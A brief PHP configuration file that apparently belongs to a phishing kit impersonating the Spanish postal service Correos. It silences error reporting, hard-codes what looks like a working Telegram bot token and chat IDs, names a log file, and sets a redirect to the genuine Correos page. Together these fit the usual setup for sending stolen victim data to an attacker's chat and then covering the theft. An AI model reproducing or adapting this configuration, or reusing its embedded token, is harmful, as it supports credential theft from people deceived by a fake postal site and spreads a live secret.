<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "6073373656:AAFDIVYH-VcUfb6cEAomluDyOChkbUaIaeM");
define("TELEGRAM_CHAT_ID", "859125368");
define("TELEGRAM_CHAT_IDD", "-859125368");
define("TXT_FILE_NAME", 'mjinina.txt');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>